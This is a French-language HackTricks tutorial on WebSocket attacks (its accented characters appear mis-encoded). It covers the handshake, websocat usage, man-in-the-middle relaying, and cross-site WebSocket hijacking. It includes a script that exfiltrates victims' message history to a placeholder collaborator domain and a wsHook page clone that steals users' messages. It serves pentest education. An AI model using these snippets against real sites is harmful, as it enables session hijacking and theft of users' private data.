# Attaques WebSocket

{% hint style="success" %}
Apprenez et pratiquez le hacking AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Apprenez et pratiquez le hacking GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenir HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez-nous sur** **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de hacking en soumettant des PRs aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts github.

</details>
{% endhint %}

## Qu'est-ce que les WebSockets

Les connexions WebSocket sont √©tablies par le biais d'un **handshake HTTP** initial et sont con√ßues pour √™tre **durables**, permettant une messagerie bidirectionnelle √† tout moment sans avoir besoin d'un syst√®me transactionnel. Cela rend les WebSockets particuli√®rement avantageux pour les applications n√©cessitant une **latence faible ou une communication initi√©e par le serveur**, comme les flux de donn√©es financi√®res en direct.

### √âtablissement des connexions WebSocket

Une explication d√©taill√©e sur l'√©tablissement des connexions WebSocket peut √™tre consult√©e [**ici**](https://infosecwriteups.com/cross-site-websocket-hijacking-cswsh-ce2a6b0747fc). En r√©sum√©, les connexions WebSocket sont g√©n√©ralement initi√©es via JavaScript c√¥t√© client comme montr√© ci-dessous :
```javascript
var ws = new WebSocket("wss://normal-website.com/ws");
```
Le protocole `wss` signifie une connexion WebSocket s√©curis√©e avec **TLS**, tandis que `ws` indique une connexion **non s√©curis√©e**.

Lors de l'√©tablissement de la connexion, une poign√©e de main est effectu√©e entre le navigateur et le serveur via HTTP. Le processus de poign√©e de main implique que le navigateur envoie une requ√™te et que le serveur r√©pond, comme illustr√© dans les exemples suivants :

Le navigateur envoie une requ√™te de poign√©e de main :
```javascript
GET /chat HTTP/1.1
Host: normal-website.com
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==
Connection: keep-alive, Upgrade
Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2
Upgrade: websocket
```
R√©ponse de poign√©e de main du serveur :
```javascript
HTTP/1.1 101 Switching Protocols
Connection: Upgrade
Upgrade: websocket
Sec-WebSocket-Accept: 0FFP+2nmNIf/h+4BP36k9uzrYGk=
```
La connexion reste ouverte pour l'√©change de messages dans les deux sens une fois √©tablie.

**Points cl√©s de la poign√©e de main WebSocket :**

- Les en-t√™tes `Connection` et `Upgrade` signalent l'initiation d'une poign√©e de main WebSocket.
- L'en-t√™te `Sec-WebSocket-Version` indique la version du protocole WebSocket souhait√©e, g√©n√©ralement `13`.
- Une valeur al√©atoire encod√©e en Base64 est envoy√©e dans l'en-t√™te `Sec-WebSocket-Key`, garantissant que chaque poign√©e de main est unique, ce qui aide √† pr√©venir les probl√®mes avec les proxies de mise en cache. Cette valeur n'est pas pour l'authentification mais pour confirmer que la r√©ponse n'est pas g√©n√©r√©e par un serveur ou un cache mal configur√©.
- L'en-t√™te `Sec-WebSocket-Accept` dans la r√©ponse du serveur est un hachage de la `Sec-WebSocket-Key`, v√©rifiant l'intention du serveur d'ouvrir une connexion WebSocket.

Ces fonctionnalit√©s garantissent que le processus de poign√©e de main est s√©curis√© et fiable, ouvrant la voie √† une communication en temps r√©el efficace.


### Console Linux

Vous pouvez utiliser `websocat` pour √©tablir une connexion brute avec un websocket.
```bash
websocat --insecure wss://10.10.10.10:8000 -v
```
Ou pour cr√©er un serveur websocat :
```bash
websocat -s 0.0.0.0:8000 #Listen in port 8000
```
### MitM websocket connections

Si vous constatez que des clients sont connect√©s √† un **HTTP websocket** depuis votre r√©seau local actuel, vous pourriez essayer une [ARP Spoofing Attack ](../generic-methodologies-and-resources/pentesting-network/#arp-spoofing)pour effectuer une attaque MitM entre le client et le serveur.\
Une fois que le client essaie de se connecter, vous pouvez alors utiliser :
```bash
websocat -E --insecure --text ws-listen:0.0.0.0:8000 wss://10.10.10.10:8000 -v
```
### Websockets enumeration

Vous pouvez utiliser l'**outil** [**https://github.com/PalindromeLabs/STEWS**](https://github.com/PalindromeLabs/STEWS) **pour d√©couvrir, identifier et rechercher des** **vuln√©rabilit√©s** **connues dans les websockets automatiquement.**

### Websocket Debug tools

* **Burp Suite** prend en charge la communication MitM des websockets de mani√®re tr√®s similaire √† celle qu'elle utilise pour la communication HTTP r√©guli√®re.
* L'**extension Burp Suite** [**socketsleuth**](https://github.com/snyk/socketsleuth) **vous permettra de mieux g√©rer les communications Websocket dans Burp en obtenant l'** **historique**, en d√©finissant des **r√®gles d'interception**, en utilisant des r√®gles de **correspondance et de remplacement**, en utilisant **Intruder** et **AutoRepeater.**
* [**WSSiP**](https://github.com/nccgroup/wssip)**:** Abr√©viation de "**WebSocket/Socket.io Proxy**", cet outil, √©crit en Node.js, fournit une interface utilisateur pour **capturer, intercepter, envoyer des messages personnalis√©s** et voir toutes les communications WebSocket et Socket.IO entre le client et le serveur.
* [**wsrepl**](https://github.com/doyensec/wsrepl) est un **REPL websocket interactif** con√ßu sp√©cifiquement pour les tests de p√©n√©tration. Il fournit une interface pour observer les **messages websocket entrants et envoyer de nouveaux**, avec un cadre facile √† utiliser pour **automatiser** cette communication.&#x20;
* [**https://websocketking.com/**](https://websocketking.com/) c'est un **web pour communiquer** avec d'autres webs en utilisant des **websockets**.
* [**https://hoppscotch.io/realtime/websocket**](https://hoppscotch.io/realtime/websocket) parmi d'autres types de communications/protocoles, il fournit un **web pour communiquer** avec d'autres webs en utilisant des **websockets.**

## Websocket Lab

Dans [**Burp-Suite-Extender-Montoya-Course**](https://github.com/federicodotta/Burp-Suite-Extender-Montoya-Course) vous avez un code pour lancer un web utilisant des websockets et dans [**ce post**](https://security.humanativaspa.it/extending-burp-suite-for-fun-and-profit-the-montoya-way-part-3/) vous pouvez trouver une explication.

## Cross-site WebSocket hijacking (CSWSH)

**Le d√©tournement de WebSocket entre sites**, √©galement connu sous le nom de **d√©tournement de WebSocket cross-origin**, est identifi√© comme un cas sp√©cifique de **[Cross-Site Request Forgery (CSRF)](csrf-cross-site-request-forgery.md)** affectant les √©changes WebSocket. Cette vuln√©rabilit√© survient lorsque les √©changes WebSocket s'authentifient uniquement via des **cookies HTTP** sans **tokens CSRF** ou mesures de s√©curit√© similaires.

Les attaquants peuvent en tirer parti en h√©bergeant une **page web malveillante** qui initie une connexion WebSocket entre sites √† une application vuln√©rable. Par cons√©quent, cette connexion est consid√©r√©e comme faisant partie de la session de la victime avec l'application, exploitant le manque de protection CSRF dans le m√©canisme de gestion des sessions.

### Simple Attack

Notez que lors de l'**√©tablissement** d'une connexion **websocket**, le **cookie** est **envoy√©** au serveur. Le **serveur** peut l'utiliser pour **relier** chaque **utilisateur sp√©cifique** √† sa **session websocket bas√©e sur le cookie envoy√©**.

Ensuite, si par **exemple** le **serveur websocket** **renvoie l'historique de la conversation** d'un utilisateur si un msg avec "**READY"** est envoy√©, alors un **simple XSS** √©tablissant la connexion (le **cookie** sera **envoy√©** **automatiquement** pour autoriser l'utilisateur victime) **en envoyant** "**READY**" pourra **r√©cup√©rer** l'historique de la **conversation**.
```markup
<script>
websocket = new WebSocket('wss://your-websocket-URL')
websocket.onopen = start
websocket.onmessage = handleReply
function start(event) {
websocket.send("READY"); //Send the message to retreive confidential information
}
function handleReply(event) {
//Exfiltrate the confidential information to attackers server
fetch('https://your-collaborator-domain/?'+event.data, {mode: 'no-cors'})
}
</script>
```
### Cross Origin + Cookie avec un sous-domaine diff√©rent

Dans cet article de blog [https://snyk.io/blog/gitpod-remote-code-execution-vulnerability-websockets/](https://snyk.io/blog/gitpod-remote-code-execution-vulnerability-websockets/), l'attaquant a r√©ussi √† **ex√©cuter du Javascript arbitraire dans un sous-domaine** du domaine o√π la communication par web socket avait lieu. Comme c'√©tait un **sous-domaine**, le **cookie** √©tait **envoy√©**, et parce que le **Websocket ne v√©rifiait pas correctement l'Origin**, il √©tait possible de communiquer avec lui et **de voler des tokens**.

### Vol de donn√©es utilisateur

Copiez l'application web que vous souhaitez imiter (les fichiers .html par exemple) et √† l'int√©rieur du script o√π la communication par websocket a lieu, ajoutez ce code :
```javascript
//This is the script tag to load the websocket hooker
<script src='wsHook.js'></script>

//These are the functions that are gonig to be executed before a message
//is sent by the client or received from the server
//These code must be between some <script> tags or inside a .js file
wsHook.before = function(data, url) {
var xhttp = new XMLHttpRequest();
xhttp.open("GET", "client_msg?m="+data, true);
xhttp.send();
}
wsHook.after = function(messageEvent, url, wsObject) {
var xhttp = new XMLHttpRequest();
xhttp.open("GET", "server_msg?m="+messageEvent.data, true);
xhttp.send();
return messageEvent;
}
```
Maintenant, t√©l√©chargez le fichier `wsHook.js` depuis [https://github.com/skepticfx/wshook](https://github.com/skepticfx/wshook) et **enregistrez-le dans le dossier avec les fichiers web**.\
En exposant l'application web et en faisant en sorte qu'un utilisateur s'y connecte, vous pourrez voler les messages envoy√©s et re√ßus via websocket :
```javascript
sudo python3 -m http.server 80
```
## Conditions de course

Les Conditions de course dans les WebSockets sont √©galement un sujet, [consultez cette information pour en savoir plus](race-condition.md#rc-in-websockets).

## Autres vuln√©rabilit√©s

Comme les Web Sockets sont un m√©canisme pour **envoyer des donn√©es vers le serveur et le client**, selon la mani√®re dont le serveur et le client g√®rent l'information, **les Web Sockets peuvent √™tre utilis√©s pour exploiter plusieurs autres vuln√©rabilit√©s comme XSS, SQLi ou toute autre vuln√©rabilit√© web courante en utilisant l'entr√©e d'un utilisateur depuis un websocket.**

## **WebSocket Smuggling**

Cette vuln√©rabilit√© pourrait vous permettre de **contourner les restrictions des proxies inverses** en leur faisant croire qu'une **communication websocket a √©t√© √©tablie** (m√™me si ce n'est pas vrai). Cela pourrait permettre √† un attaquant d'**acc√©der √† des points de terminaison cach√©s**. Pour plus d'informations, consultez la page suivante :

{% content-ref url="h2c-smuggling.md" %}
[h2c-smuggling.md](h2c-smuggling.md)
{% endcontent-ref %}

## R√©f√©rences

* [https://portswigger.net/web-security/websockets#intercepting-and-modifying-websocket-messages](https://portswigger.net/web-security/websockets#intercepting-and-modifying-websocket-messages)

{% hint style="success" %}
Apprenez et pratiquez le Hacking AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Apprenez et pratiquez le Hacking GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenir HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** nous sur **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de hacking en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts github.

</details>
{% endhint %}
